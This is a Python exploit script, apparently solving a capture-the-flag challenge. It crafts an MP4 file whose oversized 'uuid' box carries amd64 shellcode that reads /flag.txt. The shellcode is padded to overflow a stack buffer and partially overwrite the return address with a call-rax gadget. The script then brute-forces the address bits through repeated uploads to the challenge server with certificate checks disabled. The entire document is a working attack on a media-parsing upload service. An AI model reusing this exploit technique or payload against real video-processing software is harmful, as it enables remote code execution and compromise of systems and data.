#!/usr/bin/env python3
from pathlib import Path
import re
import struct
import sys

import requests
import urllib3
from pwn import asm, context, p16, shellcraft


URL = "https://dalctf-video-killed-the-pwn-star-204-64616c.instancer.dalctf2026.com/upload"
TARGET_UUID = bytes(
    [
        0x44,
        0x41,
        0x4C,
        0x43,
        0x54,
        0x46,
        0x32,
        0x30,
        0x32,
        0x36,
        0x00,
        0x01,
        0x00,
        0x00,
        0x00,
        0x00,
    ]
)
OFFSET_RIP = 280
OFFSET_BUF = 272
CALL_RAX = 0x1014
ATTEMPTS = 200


def build_base_video() -> bytes:
    base = Path("base6.mp4")
    if base.exists():
        return base.read_bytes()
    print("[*] base6.mp4 not found, generating a 6-second MP4 locally")
    import subprocess

    subprocess.run(
        [
            "ffmpeg",
            "-y",
            "-f",
            "lavfi",
            "-i",
            "color=c=black:s=16x16:d=6",
            "-c:v",
            "libx264",
            "-t",
            "6",
            "base6.mp4",
        ],
        check=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    return base.read_bytes()


def build_shellcode() -> bytes:
    context.arch = "amd64"
    return asm("endbr64\n" + shellcraft.cat("/flag.txt") + shellcraft.exit(0))


def build_mp4(base: bytes, shellcode: bytes, low16: int) -> bytes:
    payload = shellcode.ljust(OFFSET_BUF, b"\x90") + (b"B" * 8) + p16(low16)
    assert len(payload) == OFFSET_RIP + 2
    box = struct.pack(">I4s", 24 + len(payload), b"uuid") + TARGET_UUID + payload
    return base + box


def extract_flag(text: str) -> str | None:
    pre = re.search(r"<pre>(.*?)</pre>", text, re.S)
    body = pre.group(1) if pre else text
    match = re.search(r"([A-Za-z0-9_]+\{[^<>\n]+\})", body)
    if match:
        return match.group(1)
    return None


def main() -> int:
    urllib3.disable_warnings()
    base = build_base_video()
    shellcode = build_shellcode()
    lows = [((n << 12) + CALL_RAX) & 0xFFFF for n in range(16)]
    session = requests.Session()

    print(f"[*] shellcode length: {len(shellcode)} bytes")
    print(f"[*] brute-forcing low 16 bits across up to {ATTEMPTS} uploads")

    for attempt in range(1, ATTEMPTS + 1):
        low16 = lows[(attempt - 1) % len(lows)]
        mp4 = build_mp4(base, shellcode, low16)
        files = {"video": ("exploit.mp4", mp4, "video/mp4")}

        try:
            response = session.post(URL, files=files, timeout=15, verify=False)
        except Exception as exc:
            print(f"[!] attempt {attempt:03d} failed: {exc}")
            continue

        flag = extract_flag(response.text)
        print(f"[*] attempt {attempt:03d} low16={low16:#06x} status={response.status_code}")
        if flag:
            print(flag)
            return 0

    print("[!] flag not found; try running again")
    return 1


if __name__ == "__main__":
    sys.exit(main())
